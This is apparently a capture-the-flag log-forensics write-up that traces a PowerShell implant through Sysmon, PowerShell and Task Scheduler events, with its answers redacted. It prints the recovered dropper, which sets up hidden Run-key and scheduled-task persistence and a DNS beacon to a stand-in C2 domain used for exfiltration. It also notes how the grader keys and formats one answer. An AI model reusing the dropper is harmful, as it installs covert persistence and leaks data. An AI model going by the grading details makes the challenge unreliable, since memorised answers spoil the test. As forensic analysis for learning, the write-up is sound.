# Logs

Evidence: the EVTX pack — **Sysmon Operational**, **PowerShell Operational**, **TaskScheduler
Operational**, and the workstation **Security** log. I parsed them with `python-evtx`, pulling
`EventID` and the `<Data Name="…">` fields out of each record's XML.

## Malicious process (50)
Sysmon EID 1 (process create). The implant runs as **`powershell.exe`**:
`"powershell.exe" -w hidden -ep bypass -Command "Resolve-DnsName 7f3a9c.b.cdn-hamilton-sync.test …"`.
Answer: `████`.

## Parent process (50)
Same EID 1 record → `ParentImage` = `C:\Windows\System32\**svchost.exe**` running
`-k netsvcs -p -s Schedule` (the Task Scheduler service host) — confirming "fully automated via a
scheduled task". Answer: `████`.

## First execution — UTC (100)
The hint: *Sysmon 1, UtcTime of the first malicious `powershell.exe`*. The first malicious
PowerShell is the **persistence installer** (`…\coach_staging\drop_persist.ps1`), Sysmon EID 1
`UtcTime` ≈ **08:26** UTC on 2026-11-12 (= 09:26 local — submit UTC). The grader keys on this
installer, not the later beacon (which first fires at 08:36). *Format gotcha: it wanted
`YYYY-MM-DD HH:MM` (date + minute, no seconds).* Answer: `████`.

## Scheduled task name (100)
TaskScheduler EID 106 (task registered): the only non-Microsoft registration is
**`\Microsoft\Windows\SyncHelper\Refresh`**, registered 2026-11-12 08:26:02 by the machine
account `HAM-FIN-WKS07$`. Confirmed in the dropper code
(`Register-ScheduledTask -TaskName "Refresh" -TaskPath "\Microsoft\Windows\SyncHelper\"`).
Answer: `████`.

## Decoded script block target (150)
PowerShell Operational EID 4104 (script-block logging). The dropper's script block contains the
scheduled-task action, which calls `Resolve-DnsName 7f3a9c.b.**cdn-hamilton-sync.test**` — the
beacon's C2 domain. Answer: `████`.

## Exfil request count (150)
Sysmon EID 22 (DNS query) filtered to the C2 domain: the data-carrying queries use a `.x.`
sub-channel. There are **16** of them (cross-checked against the pcap). Answer: `████`.

### Dropper (recovered from EID 4104, abridged)
```powershell
$base = "C:\Users\lmartens\AppData\Roaming\Microsoft\SyncHelper"
Copy-Item C:\coach_staging\synchelper.ps1 "$base\synchelper.ps1" -Force
New-ItemProperty -Path $run -Name "OneDriveSyncHelper" `
  -Value "powershell.exe -w hidden -ep bypass -f `"$base\synchelper.ps1`"" -PropertyType String
$act = New-ScheduledTaskAction -Execute "powershell.exe" `
  -Argument '-w hidden -ep bypass -Command "Resolve-DnsName 7f3a9c.b.cdn-hamilton-sync.test …"'
Register-ScheduledTask -TaskName "Refresh" -TaskPath "\Microsoft\Windows\SyncHelper\" …
```
